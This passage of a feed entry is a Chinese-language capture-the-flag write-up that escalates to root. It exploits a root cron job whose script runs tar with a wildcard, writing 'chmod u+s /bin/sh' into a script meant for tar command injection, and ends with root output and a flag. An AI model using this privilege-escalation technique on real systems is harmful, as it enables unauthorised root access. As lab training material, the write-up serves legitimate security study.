--rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene   <span class="m">7231</span> Dec <span class="m">23</span> 05:04 sys-2448.BAK
--rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">27182</span> Dec <span class="m">23</span> 05:03 sys-5018.BAK</code></pre></div></p>
-
-<p>backup目錄看起來每隔一分鐘就會生出一個檔案，每五分鐘就會打包一包backup.tar.gz</p>
-
-<p>推測是有在跑cron，剛好/etc/crontab也可以讀取，就來看看cron的設定</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;
-
-&lt;h1&gt;/etc/crontab: system-wide crontab&lt;/h1&gt;
-
-&lt;h1&gt;Unlike any other crontab you don<span class="p">&amp;</span>rsquo<span class="p">;</span>t have to run the <span class="sb">`</span>crontab<span class="err">&#39;</span>&lt;/h1&gt;
-
-&lt;h1&gt;command to install the new version when you edit this file&lt;/h1&gt;
-
-&lt;h1&gt;and files in /etc/cron.d. These files also have username fields,&lt;/h1&gt;
-
-&lt;h1&gt;that none of the other crontabs <span class="k">do</span>.&lt;/h1&gt;
-
-&lt;p&gt;SHELL<span class="o">=</span>/bin/sh
-<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&lt;/p&gt;
-
-&lt;h1&gt;m h dom mon dow user  <span class="nb">command</span>&lt;/h1&gt;
-
-&lt;p&gt;17 *    * * *   root    <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.hourly
-<span class="m">25</span> <span class="m">6</span>    * * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.daily <span class="o">)</span>
-<span class="m">47</span> <span class="m">6</span>    * * <span class="m">7</span>   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.weekly <span class="o">)</span>
-<span class="m">52</span> <span class="m">6</span>    <span class="m">1</span> * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.monthly <span class="o">)</span>
-<span class="c">#</span>
-* * * * * root /root/create_backup.sh
-*/5 * * * * root /usr/bin/compress.sh</code></pre></div></p>
-
-<p>只能看到/usr/bin/compress.sh的內容</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">cat compress.sh&lt;/p&gt;
-
-&lt;h1&gt;!/bin/sh&lt;/h1&gt;
-
-&lt;p&gt;rm -f /home/rene/backup/backup.tar.gz
-<span class="nb">cd</span> /home/rene/backup
-tar cfz /home/rene/backup/backup.tar.gz *
-chown rene:rene /home/rene/backup/backup.tar.gz
-rm -f /home/rene/backup/*.BAK</code></pre></div></p>
-
-<p>這邊PATH的設定方式沒辦法達到替換指令的效果</p>
-
-<p>看來只能<a href="http://www.net-security.org/article.php?id=2061">靠tar來做command injection</a>了</p>
-
-<p>於是直接給/bin/sh加上了stickybit</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>chmod u+s /bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt; shell.sh</code></pre></div></p>
-
-<p>等時間一到就可以拿到root的權限了</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;
-
-&lt;h1&gt;sh&lt;/h1&gt;
-
-&lt;p&gt;sh&lt;/p&gt;
-
-&lt;h1&gt;id&lt;/h1&gt;
-
-&lt;p&gt;id
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>&lt;/p&gt;
-
-&lt;h1&gt;cat /root/flag.txt&lt;/h1&gt;
-
-&lt;p&gt;cat /root/flag.txt
-                                                                   .aMMMMMMMMn.  ,aMMMMn.
-                                                                 .aMccccccccc&lt;em&gt;YMMn.    &lt;code&gt;Mb
-                                                                aMccccccccccccccc*Mn    MP
-                                                               .AMMMMn.   MM&lt;/code&gt;&lt;/em&gt;YMMY&lt;em&gt;ccaM&lt;/em&gt;
-                                                              dM&lt;em&gt;  &lt;/em&gt;YMMb  YP        <span class="sb">`</span>cMY
-                                                              YM.  .dMMP   aMn.     .cMP
-                                                               &lt;em&gt;YMMn.     aMMMMMMMMMMMY<span class="s1">&#39;</span>
-<span class="s1">                                                                .&amp;lsquo;YMMb.           ccMP</span>
-<span class="s1">                                                             .dMcccccc&lt;/em&gt;Mc&amp;hellip;.cMb.cMP&amp;rsquo;</span>
-<span class="s1">                                                           .dMMMMb;cccc&lt;em&gt;Mbcccc,IMMMMMMMn.</span>
-<span class="s1">                                                          dY&lt;/em&gt;&amp;lsquo;  &amp;rsquo;&lt;em&gt;M;ccccMM..dMMM..MP&lt;/em&gt;cc&lt;em&gt;Mb</span>
-<span class="s1">                                                          YM.    ,MbccMMMMMMMMMMMM&lt;/em&gt;cccc;MP</span>
-<span class="s1">                                                           &lt;em&gt;Mbn;adMMMMMMMMMMMMMMMIcccc;M&lt;/em&gt;</span>
-<span class="s1">                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP</span>
-<span class="s1">                                                          Yb;cc;dMMMMMMMMMMMP&lt;em&gt;&amp;lsquo;  &lt;/em&gt;YMMP&lt;em&gt;</span>
-<span class="s1">                                                           &lt;/em&gt;YMMMPYMMMMMMP*&amp;rsquo;          curchack</span>
-<span class="s1">                                                       +####################################+</span>
-<span class="s1">                                                       |======                            | |</span>
-<span class="s1">                                                       |======                            | |</span>
-<span class="s1">                                                       |======                            | |</span>
-<span class="s1">                                                       |======                            | |</span>
-<span class="s1">                                                       |======                            | |</span>
-<span class="s1">                                                       +&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-+-+</span>
-<span class="s1">                                                        ####################################</span>
-<span class="s1">                                                             |======                  |</span>
-<span class="s1">                                                             |======                  |</span>
-<span class="s1">                                                             |=====                   |</span>
-<span class="s1">                                                             |====                    |</span>
-<span class="s1">                                                             |                        |</span>
-<span class="s1">                                                             +                        +&lt;/p&gt;</span>
-
-<span class="s1">&lt;p&gt; .d8888b.                 d8b          d8b               888                                                                    d8b</span>
-<span class="s1">d88P  Y88b                Y8P          88P               888                                                                    Y8P</span>
-<span class="s1">888    888                             8P                888</span>
-<span class="s1">888        .d88b.  .d8888b888   88888b.&amp;ldquo;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.</span>
-<span class="s1">888       d8P  Y8bd88P&amp;rdquo;   888   888 &amp;ldquo;88b d8P  Y8b88K     888      888 &quot;88b    &quot;88b88K        888  888888 &quot;88bd8P  Y8b   888 &quot;88b888888 &quot;88bd8P  Y8b</span>
-<span class="s1">888    88888888888888     888   888  888 88888888&quot;Y8888b.888      888  888.d888888&quot;Y8888b.   888  888888  88888888888   888  888888888  88888888888</span>
-<span class="s1">Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b</span>
-<span class="s1"> &quot;Y8888P&amp;rdquo;  &amp;ldquo;Y8888  &quot;Y8888P888   888  888  &quot;Y8888  88888P&#39;</span> <span class="s2">&quot;Y888   88888P&amp;rdquo; &amp;ldquo;Y888888 88888P&#39;    &quot;</span>Y88888888  <span class="m">888</span> <span class="s2">&quot;Y8888    88888P&amp;rdquo; 88888888P&quot;</span>  <span class="p">&amp;</span>ldquo<span class="p">;</span>Y8888Y8P
-                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
-                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
-                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
-Well Done!
-Here<span class="p">&amp;</span>rsquo<span class="p">;</span>s your flag: 0089cd4f9ae79402cdd4e7b8931892b7</code></pre></div></p>
 ]]></content>
   </entry>
   
